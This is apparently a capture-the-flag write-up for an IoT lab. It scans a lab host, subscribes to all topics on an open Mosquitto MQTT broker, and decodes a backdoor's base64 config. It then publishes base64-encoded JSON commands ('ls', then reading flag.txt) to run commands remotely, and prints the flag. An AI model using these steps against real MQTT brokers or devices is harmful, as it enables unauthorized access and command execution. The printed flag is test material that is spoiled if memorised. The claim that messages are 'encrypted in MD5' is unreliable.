#### Info
John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?

What is the flag?
 
---

_Possibly looking for some type of pcap file?_

---

# Nmap

```php
➜  bugged nmap -A -p- -oN nmap/initial.txt 10.10.185.229
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 08:43 BST
Nmap scan report for 10.10.185.229
Host is up (0.020s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE                  VERSION
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     kitchen/toaster: {"id":16592131440287782691,"in_use":false,"temperature":157.48482,"toast_time":181}
|     storage/thermostat: {"id":15678919872454228759,"temperature":23.598772}
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/load/bytes/received/1min: 4245.16
|     patio/lights: {"id":8513127676476778522,"color":"WHITE","status":"ON"}
|     livingroom/speaker: {"id":10437392956646599111,"gain":45}

```

I need to interact with mosquito.

```php
sudo apt install mosquitto-clients
```

- Subscribe to the machine all devices. Use “**_#_**”

```php
mosquitto_sub -h 10.10.185.229 -t "#" 
```

- Use [CyberChef](https://gchq.github.io/CyberChef/) to decode the base64, or use CLI.

![[Pasted image 20240715091005.png]]

```php
echo -n eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ== | base64 -d
```

```php
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}% 
```

- Use the value to Subscribe to IoT machine and wait for the output. Set the “**_sub_value_**” as topic “**_-t_**”. Don’t exit and move to another terminal.

```php
mosquitto_sub -h <machine_IP> -t <pub_topic>
```

![](https://miro.medium.com/v2/resize:fit:700/1*vX37bdE31hP0AjJHrNNJDA.png)

Use the value of “**_pub_topic_**” publish into the IoT machine together with random message and the host machine IP.

```php
mosquitto_pub -t <pub_topic> -m <base64_as_the_messege> -h <machine_IP>
```

```php
mosquitto_pub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -m "The Message" -h 10.10.185.229
```

![](https://miro.medium.com/v2/resize:fit:700/1*aQeAi1-brC14N0OHjutPjQ.png)

The output goes to the “Subscribe Terminal” started above.

Output of the Publish Topic to the Subscriber Topic. Don’t cancel the terminal.

![[Pasted image 20240715092117.png]]

**The messages are encrypted in MD5 depending on if you use pub or sub**
- I could see the message in plaintext and in md5 as i was playing with it.

Decode with CyberChef the Value. It Reveals a format to be used in the mosquitto.

![](https://miro.medium.com/v2/resize:fit:700/1*mbaCgLCFpWmRj70x4FKcWw.png)

Use the format to construct a command and then Encode the format into base64 as follows.

![](https://miro.medium.com/v2/resize:fit:700/1*COduqBZG4rUHg7uxhIjTKQ.png)

Repeat Publish with the base64 value above as the message “**_-m_**”.

```php
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
```

payload
```php
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo=
```

=={"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}==

Output of another Subscriber Topic.

![](https://miro.medium.com/v2/resize:fit:700/1*QFh_ljDFiaC5TSPe5GiHQw.png)

Decode with CyberChef again. Reveals that there is a “**_flag.txt_**” _file on the directory._

![](https://miro.medium.com/v2/resize:fit:700/1*WvzazZjekeHl9t9tyO1FEQ.png)

Encode the command to read from the “**_flag.txt_**” file.

![](https://miro.medium.com/v2/resize:fit:700/1*OaEbbet19tt1G5J7iKy1Ng.png)

Repeat again with Publish Topic ID.

![](https://miro.medium.com/v2/resize:fit:700/1*LwqpGQi3tT4Cku4SyL1XsQ.png)

The last base64 output from Publish Topic.

![](https://miro.medium.com/v2/resize:fit:700/1*-QQYAkWpYDyu5Qz_U3pIXg.png)

Decode with CyberChef Again. To get the flag.

---

![[Pasted image 20240715095538.png]]

**flag{18d44fc0707ac8dc8be45bb83db54013}**

---

### Working method

```php
mosquitto_sub -t "Pub_Topic_ID" -h 10.10.185.229
```

```php
mosquitto_pub -t "Sub_Topic_ID" -m "Encrytpted_String" -h 10.10.185.229
```

---




